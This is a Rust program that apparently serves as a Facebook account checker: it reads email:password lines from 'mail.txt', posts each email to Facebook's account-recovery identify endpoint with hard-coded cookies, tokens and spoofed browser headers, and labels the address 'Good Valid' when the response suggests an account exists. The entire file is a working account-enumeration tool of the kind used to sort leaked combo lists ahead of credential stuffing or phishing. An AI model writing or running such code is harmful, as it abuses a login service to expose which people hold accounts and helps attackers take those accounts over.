use std::fs;
use reqwest::blocking::Client;
use reqwest::header::{HeaderMap, HeaderValue, COOKIE};
use serde_json::Value;


fn main() {
    let file_name = fs::read_to_string("mail.txt").unwrap();

    for line in file_name.lines(){
        let split: Vec<&str> = line.split(":").collect();
        if split.len() < 2 {
            continue;
        }
        let (mail) = split[0];
        if ChkEmail(mail){
            println!("Account facebook: {} <Good Valid>" , mail);
        }
        else{
            println!("Invalid Facebook {} ", mail);
        }
     }



}
fn ChkEmail(email: &str) -> bool{
    let chekc = format!("jazoest=21037&lsd=AVryQmq7cyI&email={}&did_submit=1&__user=0&__a=1&__req=5&__hs=19806.BP%3ADEFAULT.2.0..0.0&dpr=1&__ccg=EXCELLENT&__rev=1012276621&__s=mb1j3y%3Ap0olg2%3A6bfpak&__hsi=7349985647960630937&__dyn=7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa0CEbo1nEhwem0nCq1ewcG0KEswaq0yE7i0n24o5-0ha2l0Fwwwi831w9O7U2cxe0EUjwVw9O22362W2K0zE5W0HUvw4JwJwSyES0gq0Lo6-1Fw4mwr81rE7i&__csr=&__spin_r=1012276621&__spin_b=trunk&__spin_t=1711301889", email);
    let mut headers = HeaderMap::new();
    headers.insert(COOKIE, HeaderValue::from_static("wd=1024x225; sb=zk4AZhyh7Yx-SPq7xF_Bmmke; ps_l=0; ps_n=0; datr=aWMAZsuIFcONPL7ah1nxVAfF; fr=0fZJ237iNVrwjckyN..BmAGS3..AAA.0.0.BmAGT7.AWVa8tSbzeI"));

    let client = Client::new();
    let res = client.post("https://www.facebook.com/ajax/login/help/identify.php?ctx=recover")
        .header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0")
        .header("Accept", "*/*")
        .header("Accept-Language", "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3")
        .header("Accept-Encoding", "gzip, deflate, br")
        .header("Referer", "https://www.facebook.com/login/identify/?ctx=recover&from_login_screen=0")
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("X-FB-LSD", "AVryQmq7cyI")
        .header("X-ASBD-ID", "129477")
        .header("Origin", "https://www.facebook.com")
        .header("Alt-Used", "www.facebook.com")
        .header("Connection", "keep-alive")
        .header("Sec-Fetch-Dest", "empty")
        .header("Sec-Fetch-Mode", "cors")
        .header("Sec-Fetch-Site", "same-origin")
        .header("TE", "trailers")
        .headers(headers)
        .body(chekc)
        .send().unwrap();
    let a = &res.text().unwrap();

    if a.len() > 3000{
        false
    }
    else {
        true
    }

}


